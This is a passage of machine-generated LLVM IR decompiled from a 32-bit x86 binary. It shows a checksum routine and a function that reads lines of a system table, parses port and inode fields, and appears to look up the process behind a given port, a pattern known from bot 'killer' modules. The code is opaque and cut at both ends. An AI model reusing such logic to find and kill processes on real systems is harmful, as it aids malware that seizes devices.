  %v0_804d59e = phi i32 [ %v2_804d595, %dec_label_pc_804d59e.loopexit ], [ %v2_804d586, %dec_label_pc_804d548 ]
  %v1_804d59e = urem i32 %v0_804d59e, 65536
  %v1_804d5a2 = xor i32 %v1_804d59e, 65535
  ret i32 %v1_804d5a2

dec_label_pc_804d5ac:                             ; preds = %dec_label_pc_804d545
  %v1_804d5ae = inttoptr i32 %v0_804d5ae to i8*
  %v2_804d5ae = load i8, i8* %v1_804d5ae, align 1
  %v3_804d5ae = zext i8 %v2_804d5ae to i32
  %v2_804d5b0 = add i32 %v3_804d5ae, %v0_804d5b0
  br label %dec_label_pc_804d548

; uselistorder directives
  uselistorder i32 %v2_804d595, { 2, 1, 3, 0 }
  uselistorder i32 %v2_804d586, { 3, 0, 2, 1 }
  uselistorder i32 %v1_804d540, { 1, 0 }
  uselistorder i32 %v1_804d533, { 0, 2, 1 }
  uselistorder i32 %v3_804d521, { 1, 0 }
  uselistorder i32 %v4_804d515, { 1, 0 }
  uselistorder i32 %tmp17, { 0, 2, 1 }
  uselistorder i32 %tmp16, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d590, { 1, 0 }
  uselistorder label %dec_label_pc_804d548, { 1, 0 }
  uselistorder label %dec_label_pc_804d530, { 1, 0 }
}

define i32 @function_804d5e0(i32 %arg1) local_unnamed_addr {
dec_label_pc_804d5e0:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp47 = call i8 @__decompiler_undefined_function_3()
  %tmp51 = call i8 @__decompiler_undefined_function_3()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-48 = alloca i8, align 1
  %stack_var_-4657 = alloca i32, align 4
  %stack_var_-8753 = alloca i32, align 4
  %stack_var_-8796 = alloca i8*, align 4
  %stack_var_-561 = alloca i8, align 1
  %stack_var_-8780 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804d5e0 = load i32, i32* @ebp, align 4
  %v0_804d5e1 = load i32, i32* @edi, align 4
  %v0_804d5e2 = load i32, i32* @esi, align 4
  %v0_804d5e3 = load i32, i32* @ebx, align 4
  store i32 %v0_804d5e3, i32* %stack_var_-16, align 4
  %v15_804d5e4 = ptrtoint i32* %stack_var_-8780 to i32
  %v2_804d5ea = ptrtoint i8* %stack_var_-561 to i32
  store i32 %v2_804d5ea, i32* @edi, align 4
  store i32 0, i32* %stack_var_-32, align 4
  store i8* %stack_var_-561, i8** %stack_var_-8796, align 4
  %v5_804d62d = call i32 @function_805277a(i8* nonnull %stack_var_-561, i32 0, i32 513)
  %v1_804d635 = trunc i32 %arg1 to i16
  %v2_804d635 = call i16 @llvm.bswap.i16(i16 %v1_804d635)
  %v3_804d635 = zext i16 %v2_804d635 to i32
  %v2_804d640 = ptrtoint i32* %stack_var_-8753 to i32
  store i32 %v2_804d640, i32* %eax.global-to-local, align 4
  store i32 %v3_804d635, i32* @ebx, align 4
  %tmp71 = bitcast i32* %stack_var_-8753 to i8*
  store i8* %tmp71, i8** %stack_var_-8796, align 4
  %v5_804d64b = call i32 @function_805277a(i8* %tmp71, i32 0, i32 4096)
  store i32 %v5_804d64b, i32* %eax.global-to-local, align 4
  %v2_804d65a = ptrtoint i32* %stack_var_-4657 to i32
  store i32 %v2_804d65a, i32* %edx.global-to-local, align 4
  %tmp72 = bitcast i32* %stack_var_-4657 to i8*
  store i8* %tmp72, i8** %stack_var_-8796, align 4
  %v5_804d662 = call i32 @function_805277a(i8* %tmp72, i32 0, i32 4096)
  %v2_804d66a = ptrtoint i8* %stack_var_-48 to i32
  store i32 %v2_804d66a, i32* %eax.global-to-local, align 4
  %v0_804d674 = load i32, i32* @ebx, align 4
  %v5_804d674 = inttoptr i32 %v0_804d674 to i8*
  store i8* %v5_804d674, i8** %stack_var_-8796, align 4
  %v4_804d675 = sext i32 %v0_804d674 to i64
  %v5_804d675 = call i32 @function_8052060(i64 %v4_804d675, i32 16, i32 %v2_804d66a)
  store i32 %v5_804d675, i32* %eax.global-to-local, align 4
  store i32 %v2_804d66a, i32* %edx.global-to-local, align 4
  store i8* %stack_var_-48, i8** %stack_var_-8796, align 4
  %v3_804d683 = call i32 @function_8051c50(i8* nonnull %stack_var_-48)
  store i32 %v3_804d683, i32* %eax.global-to-local, align 4
  %v9_804d68b = icmp eq i32 %v3_804d683, 2
  br i1 %v9_804d68b, label %dec_label_pc_804dbb5, label %dec_label_pc_804d694

dec_label_pc_804d694:                             ; preds = %dec_label_pc_804d5e0, %dec_label_pc_804dbb5
  store i32 0, i32* @ebx, align 4
  store i8* inttoptr (i32 6 to i8*), i8** %stack_var_-8796, align 4
  %v3_804d69b = call i32 @function_8051300(i8 6)
  store i32 %v3_804d69b, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 7 to i8*), i8** %stack_var_-8796, align 4
  %v3_804d6a7 = call i32 @function_8051300(i8 7)
  store i32 %v3_804d6a7, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 9 to i8*), i8** %stack_var_-8796, align 4
  %v3_804d6b3 = call i32 @function_8051300(i8 9)
  %v2_804d6b8 = load i8*, i8** %stack_var_-8796, align 4
  %v3_804d6b8 = ptrtoint i8* %v2_804d6b8 to i32
  store i32 %v3_804d6b8, i32* %eax.global-to-local, align 4
  store i32 16, i32* %edx.global-to-local, align 4
  store i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8054b50.20, i32 0, i32 0), i8** %stack_var_-8796, align 4
  %v4_804d6c1 = call i32 @function_8052302(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8054b50.20, i32 0, i32 0), i32 0)
  store i32 %v4_804d6c1, i32* @eax, align 4
  store i32 %v4_804d6c1, i32* @ebp, align 4
  %v10_804d6cb = icmp eq i32 %v4_804d6c1, -1
  br i1 %v10_804d6cb, label %dec_label_pc_804db4e, label %dec_label_pc_804d6d4.outer.preheader

dec_label_pc_804d6d4.outer.preheader:             ; preds = %dec_label_pc_804d694
  store i8* %stack_var_-561, i8** %stack_var_-8796, align 4
  %v4_804d6dc9095 = call i32 @function_8051e70(i32 %v2_804d5ea, i32 512, i32 %v4_804d6c1)
  store i32 %v4_804d6dc9095, i32* %eax.global-to-local, align 4
  %v1_804d6e49196 = icmp eq i32 %v4_804d6dc9095, 0
  br i1 %v1_804d6e49196, label %dec_label_pc_804d80b.loopexit, label %dec_label_pc_804d6ec.lr.ph.lr.ph

dec_label_pc_804d6ec.lr.ph.lr.ph:                 ; preds = %dec_label_pc_804d6d4.outer.preheader
  %v2_804d718 = add i32 %v15_804d5e4, 8221
  %v2_804d744 = add i32 %v15_804d5e4, 8219
  br label %dec_label_pc_804d6ec.lr.ph

dec_label_pc_804d6ec:                             ; preds = %dec_label_pc_804d6ec.lr.ph, %dec_label_pc_804d6d4.backedge
  %v4_804d6dc92 = phi i32 [ %v4_804d6dc9098, %dec_label_pc_804d6ec.lr.ph ], [ %v4_804d6dc, %dec_label_pc_804d6d4.backedge ]
  %v3_804d6ec = load i8, i8* %stack_var_-561, align 1
  %v4_804d6ec = sext i8 %v3_804d6ec to i32
  %v7_804d6ec = and i32 %v4_804d6dc92, -256
  %v8_804d6ec = or i32 %v4_804d6ec, %v7_804d6ec
  store i32 %v8_804d6ec, i32* @eax, align 4
  %v4_804d6f3 = icmp eq i8 %v3_804d6ec, 0
  br i1 %v4_804d6f3, label %dec_label_pc_804db17, label %dec_label_pc_804d6fb

dec_label_pc_804d6fb:                             ; preds = %dec_label_pc_804d6ec
  store i32 0, i32* %edx.global-to-local, align 4
  %v10_804d6fd = icmp eq i8 %v3_804d6ec, 58
  br i1 %v10_804d6fd, label %dec_label_pc_804db17, label %dec_label_pc_804d705.preheader

dec_label_pc_804d705.preheader:                   ; preds = %dec_label_pc_804d6fb
  %v1_804d706.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804d705

dec_label_pc_804d705:                             ; preds = %dec_label_pc_804d705.preheader, %dec_label_pc_804d70d
  %v6_804d706 = phi i32 [ %v8_804d6ec, %dec_label_pc_804d705.preheader ], [ %v8_804d706, %dec_label_pc_804d70d ]
  %v0_804d705 = phi i32 [ 0, %dec_label_pc_804d705.preheader ], [ %v1_804d705, %dec_label_pc_804d70d ]
  %v1_804d705 = add i32 %v0_804d705, 1
  store i32 %v1_804d705, i32* %edx.global-to-local, align 4
  %v2_804d706 = add i32 %v1_804d705, %v1_804d706.pre
  %v3_804d706 = inttoptr i32 %v2_804d706 to i8*
  %v4_804d706 = load i8, i8* %v3_804d706, align 1
  %v5_804d706 = zext i8 %v4_804d706 to i32
  %v7_804d706 = and i32 %v6_804d706, -256
  %v8_804d706 = or i32 %v5_804d706, %v7_804d706
  store i32 %v8_804d706, i32* @eax, align 4
  %v4_804d709 = icmp eq i8 %v4_804d706, 0
  br i1 %v4_804d709, label %dec_label_pc_804d6d4.backedge, label %dec_label_pc_804d70d

dec_label_pc_804d70d:                             ; preds = %dec_label_pc_804d705
  %v10_804d70d = icmp eq i8 %v4_804d706, 58
  %v1_804d70f = icmp eq i1 %v10_804d70d, false
  br i1 %v1_804d70f, label %dec_label_pc_804d705, label %dec_label_pc_804d711

dec_label_pc_804d711:                             ; preds = %dec_label_pc_804d70d, %dec_label_pc_804db17
  %v1_804d72f = phi i32 [ 0, %dec_label_pc_804db17 ], [ %v1_804d705, %dec_label_pc_804d70d ]
  %v7_804d718 = phi i32 [ %v8_804d6ec, %dec_label_pc_804db17 ], [ %v8_804d706, %dec_label_pc_804d70d ]
  %v3_804d711 = trunc i32 %v7_804d718 to i8
  %v4_804d711 = icmp eq i8 %v3_804d711, 0
  br i1 %v4_804d711, label %dec_label_pc_804d6d4.backedge, label %dec_label_pc_804d715

dec_label_pc_804d6d4.backedge:                    ; preds = %dec_label_pc_804d705, %dec_label_pc_804d711, %dec_label_pc_804d744
  %v0_804d6d4.be = phi i32 [ %v7_804d718, %dec_label_pc_804d711 ], [ 0, %dec_label_pc_804d744 ], [ %v8_804d706, %dec_label_pc_804d705 ]
  store i8* %stack_var_-561, i8** %stack_var_-8796, align 4
  %v4_804d6dc = call i32 @function_8051e70(i32 %v2_804d5ea, i32 512, i32 %v0_804d6d4.be)
  store i32 %v4_804d6dc, i32* %eax.global-to-local, align 4
  %v1_804d6e4 = icmp eq i32 %v4_804d6dc, 0
  br i1 %v1_804d6e4, label %dec_label_pc_804d80b.loopexit, label %dec_label_pc_804d6ec

dec_label_pc_804d715:                             ; preds = %dec_label_pc_804d711
  %v1_804d715 = add i32 %v1_804d72f, 2
  store i32 %v1_804d715, i32* @ecx, align 4
  %v3_804d718 = add i32 %v2_804d718, %v1_804d72f
  %v4_804d718 = inttoptr i32 %v3_804d718 to i8*
  %v5_804d718 = load i8, i8* %v4_804d718, align 1
  %v6_804d718 = zext i8 %v5_804d718 to i32
  %v8_804d718 = and i32 %v7_804d718, -256
  %v9_804d718 = or i32 %v6_804d718, %v8_804d718
  store i32 %v9_804d718, i32* %eax.global-to-local, align 4
  %v4_804d71f = icmp eq i8 %v5_804d718, 0
  br i1 %v4_804d71f, label %dec_label_pc_804d744, label %dec_label_pc_804d727

dec_label_pc_804d727:                             ; preds = %dec_label_pc_804d715
  %v7_804d727 = icmp eq i8 %v5_804d718, 32
  br i1 %v7_804d727, label %dec_label_pc_804d744, label %dec_label_pc_804d72f

dec_label_pc_804d72f:                             ; preds = %dec_label_pc_804d727
  %v0_804d72f = load i32, i32* @edi, align 4
  %v2_804d72f = add i32 %v0_804d72f, %v1_804d72f
  store i32 %v2_804d72f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d732

dec_label_pc_804d732:                             ; preds = %dec_label_pc_804d73a, %dec_label_pc_804d72f
  %v5_804d732 = phi i32 [ %v7_804d732, %dec_label_pc_804d73a ], [ %v1_804d72f, %dec_label_pc_804d72f ]
  %v0_804d735 = phi i32 [ %v1_804d735, %dec_label_pc_804d73a ], [ %v2_804d72f, %dec_label_pc_804d72f ]
  %v1_804d732 = add i32 %v0_804d735, 3
  %v2_804d732 = inttoptr i32 %v1_804d732 to i8*
  %v3_804d732 = load i8, i8* %v2_804d732, align 1
  %v4_804d732 = zext i8 %v3_804d732 to i32
  %v6_804d732 = and i32 %v5_804d732, -256
  %v7_804d732 = or i32 %v4_804d732, %v6_804d732
  store i32 %v7_804d732, i32* %edx.global-to-local, align 4
  %v1_804d735 = add i32 %v0_804d735, 1
  store i32 %v1_804d735, i32* %eax.global-to-local, align 4
  %v4_804d736 = icmp eq i8 %v3_804d732, 0
  br i1 %v4_804d736, label %dec_label_pc_804d73f, label %dec_label_pc_804d73a

dec_label_pc_804d73a:                             ; preds = %dec_label_pc_804d732
  %v7_804d73a = icmp eq i8 %v3_804d732, 32
  %v1_804d73d = icmp eq i1 %v7_804d73a, false
  br i1 %v1_804d73d, label %dec_label_pc_804d732, label %dec_label_pc_804d73f

dec_label_pc_804d73f:                             ; preds = %dec_label_pc_804d73a, %dec_label_pc_804d732
  %v2_804d73f = sub i32 %v1_804d735, %v0_804d72f
  store i32 %v2_804d73f, i32* %eax.global-to-local, align 4
  %v1_804d741 = add i32 %v2_804d73f, 2
  br label %dec_label_pc_804d744

dec_label_pc_804d744:                             ; preds = %dec_label_pc_804d715, %dec_label_pc_804d727, %dec_label_pc_804d73f
  %storemerge = phi i32 [ %v1_804d741, %dec_label_pc_804d73f ], [ %v1_804d715, %dec_label_pc_804d727 ], [ %v1_804d715, %dec_label_pc_804d715 ]
  store i32 %storemerge, i32* @esi, align 4
  %v3_804d744 = add i32 %v2_804d744, %storemerge
  %v4_804d744 = inttoptr i32 %v3_804d744 to i8*
  store i8 0, i8* %v4_804d744, align 1
  %v0_804d74f = load i32, i32* @edi, align 4
  %v1_804d74f = load i32, i32* @ecx, align 4
  %v2_804d74f = add i32 %v1_804d74f, %v0_804d74f
  store i32 %v2_804d74f, i32* @ebx, align 4
  %v5_804d752 = inttoptr i32 %v2_804d74f to i8*
  store i8* %v5_804d752, i8** %stack_var_-8796, align 4
  %v3_804d753 = call i32 @function_8051c50(i8* %v5_804d752)
  store i32 %v3_804d753, i32* %eax.global-to-local, align 4
  store i32 %v2_804d66a, i32* @edx, align 4
  %v0_804d764 = load i32, i32* @ebx, align 4
  %v5_804d764 = inttoptr i32 %v0_804d764 to i8*
  store i8* %v5_804d764, i8** %stack_var_-8796, align 4
  %v5_804d765 = call i32 @function_8051f40(i8* %v5_804d764, i32 %v3_804d753, i32 %v2_804d66a)
  %v1_804d76d = add i32 %v5_804d765, 1
  %v8_804d76d = icmp eq i32 %v1_804d76d, 0
  store i32 %v1_804d76d, i32* @eax, align 4
  br i1 %v8_804d76d, label %dec_label_pc_804d6d4.backedge, label %dec_label_pc_804d774

dec_label_pc_804d774:                             ; preds = %dec_label_pc_804d744
  %v0_804d774 = load i32, i32* @esi, align 4
  %v1_804d774 = add i32 %v0_804d774, 1
  %v0_804d777 = load i32, i32* @edi, align 4
  %v2_804d777 = add i32 %v0_804d777, %v0_804d774
  store i32 %v2_804d777, i32* %edx.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804d783.outer

dec_label_pc_804d783.outer:                       ; preds = %dec_label_pc_804db02, %dec_label_pc_804d774
  %v0_804daf830 = phi i32 [ %v1_804daf8, %dec_label_pc_804db02 ], [ 0, %dec_label_pc_804d774 ]
  %v0_804d78625 = phi i32 [ %v1_804d786, %dec_label_pc_804db02 ], [ %v1_804d774, %dec_label_pc_804d774 ]
  %v5_804d78324 = phi i32 [ %v7_804d783, %dec_label_pc_804db02 ], [ %v1_804d76d, %dec_label_pc_804d774 ]
  %v0_804d78322 = phi i32 [ %v1_804db08, %dec_label_pc_804db02 ], [ %v2_804d777, %dec_label_pc_804d774 ]
  %stack_var_-8769.1.ph = phi i8 [ %.stack_var_-8769.1, %dec_label_pc_804db02 ], [ 0, %dec_label_pc_804d774 ]
  br label %dec_label_pc_804d783

dec_label_pc_804d783:                             ; preds = %dec_label_pc_804d783.outer, %dec_label_pc_804d7a5
  %v0_804daf8 = phi i32 [ %v0_804daf830, %dec_label_pc_804d783.outer ], [ %v0_804d7a6, %dec_label_pc_804d7a5 ]
  %v0_804db10 = phi i32 [ 0, %dec_label_pc_804d783.outer ], [ %storemerge4, %dec_label_pc_804d7a5 ]
  %v0_804d786 = phi i32 [ %v0_804d78625, %dec_label_pc_804d783.outer ], [ %v1_804d786, %dec_label_pc_804d7a5 ]
  %v5_804d783 = phi i32 [ %v5_804d78324, %dec_label_pc_804d783.outer ], [ %v7_804d783, %dec_label_pc_804d7a5 ]
  %v0_804d7a5 = phi i32 [ %v0_804d78322, %dec_label_pc_804d783.outer ], [ %v1_804d7a5, %dec_label_pc_804d7a5 ]
  %v1_804d783 = add i32 %v0_804d7a5, 2
  %v2_804d783 = inttoptr i32 %v1_804d783 to i8*
  %v3_804d783 = load i8, i8* %v2_804d783, align 1
  %v4_804d783 = zext i8 %v3_804d783 to i32
  %v6_804d783 = and i32 %v5_804d783, -256
  %v7_804d783 = or i32 %v4_804d783, %v6_804d783
  store i32 %v7_804d783, i32* @eax, align 4
  %v1_804d786 = add i32 %v0_804d786, 1
  %v4_804d787 = icmp eq i8 %v3_804d783, 0
  br i1 %v4_804d787, label %dec_label_pc_804d7ab, label %dec_label_pc_804d78b

dec_label_pc_804d78b:                             ; preds = %dec_label_pc_804d783
  %v7_804d78b = icmp eq i8 %v3_804d783, 32
  br i1 %v7_804d78b, label %dec_label_pc_804db10, label %dec_label_pc_804d793

dec_label_pc_804d793:                             ; preds = %dec_label_pc_804d78b
  %v10_804d793 = icmp eq i8 %v3_804d783, 9
  br i1 %v10_804d793, label %dec_label_pc_804db10, label %dec_label_pc_804d79b

dec_label_pc_804d79b:                             ; preds = %dec_label_pc_804d793
  %v1_804d79b = trunc i32 %v0_804db10 to i8
  %v9_804d79b = icmp eq i8 %v1_804d79b, 1
  br i1 %v9_804d79b, label %dec_label_pc_804daf8, label %dec_label_pc_804d7a3

dec_label_pc_804d7a3:                             ; preds = %dec_label_pc_804daf8, %dec_label_pc_804d79b
  %v0_804d7a631 = phi i32 [ %v1_804daf8, %dec_label_pc_804daf8 ], [ %v0_804daf8, %dec_label_pc_804d79b ]
  br label %dec_label_pc_804d7a5

dec_label_pc_804d7a5:                             ; preds = %dec_label_pc_804db10, %dec_label_pc_804d7a3
  %v0_804d7a6 = phi i32 [ %v0_804d7a631, %dec_label_pc_804d7a3 ], [ %v0_804daf8, %dec_label_pc_804db10 ]
  %storemerge4 = phi i32 [ 0, %dec_label_pc_804d7a3 ], [ %v2_804db10, %dec_label_pc_804db10 ]
  store i32 %storemerge4, i32* @ebx, align 4
  %v1_804d7a5 = add i32 %v0_804d7a5, 1
  store i32 %v1_804d7a5, i32* %edx.global-to-local, align 4
  %v7_804d7a9 = icmp sgt i32 %v0_804d7a6, 6
  br i1 %v7_804d7a9, label %dec_label_pc_804d7ab, label %dec_label_pc_804d783

dec_label_pc_804d7ab:                             ; preds = %dec_label_pc_804d7a5, %dec_label_pc_804d783
  %v5_804d7ca35 = phi i32 [ %storemerge4, %dec_label_pc_804d7a5 ], [ %v0_804db10, %dec_label_pc_804d783 ]
  store i32 %v1_804d786, i32* %edx.global-to-local, align 4
  %v4_804d7ad = icmp eq i8 %stack_var_-8769.1.ph, 0
  br i1 %v4_804d7ad, label %dec_label_pc_804d6d4.outer.backedge, label %dec_label_pc_804d7b8

dec_label_pc_804d6d4.outer.backedge:              ; preds = %dec_label_pc_804d7ab, %dec_label_pc_804d7d8
  %v0_804d6d48.be = phi i32 [ %v3_804d7e7, %dec_label_pc_804d7d8 ], [ %v7_804d783, %dec_label_pc_804d7ab ]
  %stack_var_-8769.0.ph.be = phi i8 [ %stack_var_-8769.1.ph, %dec_label_pc_804d7d8 ], [ 0, %dec_label_pc_804d7ab ]
  store i8* %stack_var_-561, i8** %stack_var_-8796, align 4
  %v4_804d6dc90 = call i32 @function_8051e70(i32 %v2_804d5ea, i32 512, i32 %v0_804d6d48.be)
  store i32 %v4_804d6dc90, i32* %eax.global-to-local, align 4
  %v1_804d6e491 = icmp eq i32 %v4_804d6dc90, 0
  br i1 %v1_804d6e491, label %dec_label_pc_804d80b.loopexit, label %dec_label_pc_804d6ec.lr.ph

dec_label_pc_804d6ec.lr.ph:                       ; preds = %dec_label_pc_804d6ec.lr.ph.lr.ph, %dec_label_pc_804d6d4.outer.backedge
  %v4_804d6dc9098 = phi i32 [ %v4_804d6dc9095, %dec_label_pc_804d6ec.lr.ph.lr.ph ], [ %v4_804d6dc90, %dec_label_pc_804d6d4.outer.backedge ]
  %stack_var_-8769.0.ph97 = phi i8 [ %tmp51, %dec_label_pc_804d6ec.lr.ph.lr.ph ], [ %stack_var_-8769.0.ph.be, %dec_label_pc_804d6d4.outer.backedge ]
  br label %dec_label_pc_804d6ec

dec_label_pc_804d7b8:                             ; preds = %dec_label_pc_804d7ab
  %v3_804d7b8 = add i32 %v1_804d786, %v2_804d744
  %v4_804d7b8 = inttoptr i32 %v3_804d7b8 to i8*
  %v5_804d7b8 = load i8, i8* %v4_804d7b8, align 1
  %v6_804d7b8 = zext i8 %v5_804d7b8 to i32
  %v9_804d7b8 = or i32 %v6_804d7b8, %v6_804d783
  store i32 %v9_804d7b8, i32* %eax.global-to-local, align 4
  %v4_804d7bf = icmp eq i8 %v5_804d7b8, 0
  br i1 %v4_804d7bf, label %dec_label_pc_804d7d8, label %dec_label_pc_804d7c3

dec_label_pc_804d7c3:                             ; preds = %dec_label_pc_804d7b8
  %v7_804d7c3 = icmp eq i8 %v5_804d7b8, 32
  br i1 %v7_804d7c3, label %dec_label_pc_804d7d8, label %dec_label_pc_804d7c7

dec_label_pc_804d7c7:                             ; preds = %dec_label_pc_804d7c3
  %v2_804d7c7 = add i32 %v1_804d786, %v0_804d777
  store i32 %v2_804d7c7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d7ca

dec_label_pc_804d7ca:                             ; preds = %dec_label_pc_804d7d3, %dec_label_pc_804d7c7
  %v0_804d7cd = phi i32 [ %v1_804d7cd, %dec_label_pc_804d7d3 ], [ %v1_804d786, %dec_label_pc_804d7c7 ]
  %v5_804d7ca = phi i32 [ %v7_804d7ca, %dec_label_pc_804d7d3 ], [ %v5_804d7ca35, %dec_label_pc_804d7c7 ]
  %v0_804d7ce = phi i32 [ %v1_804d7ca, %dec_label_pc_804d7d3 ], [ %v2_804d7c7, %dec_label_pc_804d7c7 ]
  %v1_804d7ca = add i32 %v0_804d7ce, 1
  %v2_804d7ca = inttoptr i32 %v1_804d7ca to i8*
  %v3_804d7ca = load i8, i8* %v2_804d7ca, align 1
  %v1_804d7cd = add i32 %v0_804d7cd, 1
  store i32 %v1_804d7ca, i32* %eax.global-to-local, align 4
  %v4_804d7cf = icmp eq i8 %v3_804d7ca, 0
  br i1 %v4_804d7cf, label %dec_label_pc_804d7d8, label %dec_label_pc_804d7d3

dec_label_pc_804d7d3:                             ; preds = %dec_label_pc_804d7ca
  %v4_804d7ca = zext i8 %v3_804d7ca to i32
  %v6_804d7ca = and i32 %v5_804d7ca, -256
  %v7_804d7ca = or i32 %v4_804d7ca, %v6_804d7ca
  %v7_804d7d3 = icmp eq i8 %v3_804d7ca, 32
  %v1_804d7d6 = icmp eq i1 %v7_804d7d3, false
  br i1 %v1_804d7d6, label %dec_label_pc_804d7ca, label %dec_label_pc_804d7d8

dec_label_pc_804d7d8:                             ; preds = %dec_label_pc_804d7d3, %dec_label_pc_804d7ca, %dec_label_pc_804d7c3, %dec_label_pc_804d7b8
  %v1_804d7d8 = phi i32 [ %v1_804d786, %dec_label_pc_804d7c3 ], [ %v1_804d786, %dec_label_pc_804d7b8 ], [ %v1_804d7cd, %dec_label_pc_804d7ca ], [ %v1_804d7cd, %dec_label_pc_804d7d3 ]
  %v3_804d7d8 = add i32 %v1_804d7d8, %v2_804d744
  %v4_804d7d8 = inttoptr i32 %v3_804d7d8 to i8*
  store i8 0, i8* %v4_804d7d8, align 1
  %v0_804d7e3 = load i32, i32* @edi, align 4
  %v1_804d7e3 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d7e3 = add i32 %v1_804d7e3, %v0_804d7e3
  store i32 %v2_804d7e3, i32* @ebx, align 4
  %v5_804d7e6 = inttoptr i32 %v2_804d7e3 to i8*
  store i8* %v5_804d7e6, i8** %stack_var_-8796, align 4
  %v3_804d7e7 = call i32 @function_8051c50(i8* %v5_804d7e6)
  store i32 %v3_804d7e7, i32* @eax, align 4
  %v1_804d7ef = add i32 %v3_804d7e7, -15
  %v6_804d7ef = sub i32 14, %v3_804d7e7
  %v7_804d7ef = and i32 %v6_804d7ef, %v3_804d7e7
  %v8_804d7ef = icmp slt i32 %v7_804d7ef, 0
  %v9_804d7ef = icmp eq i32 %v1_804d7ef, 0
  %v10_804d7ef = icmp slt i32 %v1_804d7ef, 0
  %v3_804d7f2 = icmp eq i1 %v10_804d7ef, %v8_804d7ef
  %v4_804d7f2 = icmp eq i1 %v9_804d7ef, false
  %v5_804d7f2 = and i1 %v4_804d7f2, %v3_804d7f2
  br i1 %v5_804d7f2, label %dec_label_pc_804d6d4.outer.backedge, label %dec_label_pc_804d7f8

dec_label_pc_804d7f8:                             ; preds = %dec_label_pc_804d7d8
  %v0_804d7fa = load i32, i32* @ebx, align 4
  %v2_804d7fb = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804d7fb, i32* %eax.global-to-local, align 4
  %tmp73 = bitcast i32* %stack_var_-32 to i8*
  store i8* %tmp73, i8** %stack_var_-8796, align 4
  %v4_804d803 = call i32 @function_8051c70(i8* %tmp73, i32 %v0_804d7fa)
  store i32 %v4_804d803, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d80b

dec_label_pc_804d80b.loopexit:                    ; preds = %dec_label_pc_804d6d4.backedge, %dec_label_pc_804d6d4.outer.preheader, %dec_label_pc_804d6d4.outer.backedge
  %stack_var_-8769.0.ph.lcssa = phi i8 [ %tmp51, %dec_label_pc_804d6d4.outer.preheader ], [ %stack_var_-8769.0.ph.be, %dec_label_pc_804d6d4.outer.backedge ], [ %stack_var_-8769.0.ph97, %dec_label_pc_804d6d4.backedge ]
  %.pre = ptrtoint i32* %stack_var_-32 to i32
  %.pre46 = bitcast i32* %stack_var_-32 to i8*
  br label %dec_label_pc_804d80b

dec_label_pc_804d80b:                             ; preds = %dec_label_pc_804d80b.loopexit, %dec_label_pc_804d7f8
  %.pre-phi = phi i8* [ %.pre46, %dec_label_pc_804d80b.loopexit ], [ %tmp73, %dec_label_pc_804d7f8 ]
  %v2_804d815.pre-phi = phi i32 [ %.pre, %dec_label_pc_804d80b.loopexit ], [ %v2_804d7fb, %dec_label_pc_804d7f8 ]
  %stack_var_-8769.2 = phi i8 [ %stack_var_-8769.0.ph.lcssa, %dec_label_pc_804d80b.loopexit ], [ %stack_var_-8769.1.ph, %dec_label_pc_804d7f8 ]
  %v0_804d80e = load i32, i32* @ebp, align 4
  %v5_804d80e = inttoptr i32 %v0_804d80e to i8*
  store i8* %v5_804d80e, i8** %stack_var_-8796, align 4
  %v2_804d80f = call i32 @function_80521f1(i32 %v0_804d80e)
  %v2_804d814 = load i8*, i8** %stack_var_-8796, align 4
  %v3_804d814 = ptrtoint i8* %v2_804d814 to i32
  store i32 %v3_804d814, i32* %eax.global-to-local, align 4
  store i32 %v2_804d815.pre-phi, i32* %edx.global-to-local, align 4
  store i8* %.pre-phi, i8** %stack_var_-8796, align 4
  %v3_804d81d = call i32 @function_8051c50(i8* %.pre-phi)
  store i32 %v3_804d81d, i32* %eax.global-to-local, align 4
  %v1_804d825 = icmp eq i32 %v3_804d81d, 0
  br i1 %v1_804d825, label %dec_label_pc_804db27, label %dec_label_pc_804d82d

dec_label_pc_804d82d:                             ; preds = %dec_label_pc_804d80b
  store i8* inttoptr (i32 6 to i8*), i8** %stack_var_-8796, align 4
  %v4_804d833 = call i32 @function_8051250(i32 6, i32* null)
  store i32 %v4_804d833, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v4_804d83a = inttoptr i32 %v4_804d833 to i8*
  store i8* %v4_804d83a, i8** %stack_var_-8796, align 4
  %v2_804d83d = call i32 @function_80525b4(i32 %v4_804d833)
  store i32 %v2_804d83d, i32* %eax.global-to-local, align 4
  store i32 %v2_804d83d, i32* %stack_var_-8780, align 4
  %v1_804d849 = icmp eq i32 %v2_804d83d, 0
  br i1 %v1_804d849, label %dec_label_pc_804db77, label %dec_label_pc_804d859

dec_label_pc_804d859:                             ; preds = %dec_label_pc_804d918, %dec_label_pc_804d88a, %dec_label_pc_804d87d, %dec_label_pc_804dbee, %dec_label_pc_804d82d
  %v0_804d859 = phi i32 [ %v15_804d5e4, %dec_label_pc_804d82d ], [ %v1_804dbf7, %dec_label_pc_804dbee ], [ %v1_804d866, %dec_label_pc_804d87d ], [ %v1_804d90e, %dec_label_pc_804d88a ], [ %v1_804d990, %dec_label_pc_804d918 ]
  %v2_804d85c = inttoptr i32 %v0_804d859 to i32*
  %v3_804d85c = load i32, i32* %v2_804d85c, align 4
  store i32 %v3_804d85c, i32* @ebx, align 4
  %v2_804d860 = add i32 %v0_804d859, -16
  %v3_804d860 = inttoptr i32 %v2_804d860 to i32*
  store i32 %v3_804d85c, i32* %v3_804d860, align 4
  %v0_804d861 = call i32 @function_80526a5()
  store i32 %v0_804d861, i32* @eax, align 4
  %v0_804d866 = load i32, i32* @esp, align 4
  %v1_804d866 = add i32 %v0_804d866, 16
  %v1_804d869 = icmp eq i32 %v0_804d861, 0
  br i1 %v1_804d869, label %dec_label_pc_804db62, label %dec_label_pc_804d871

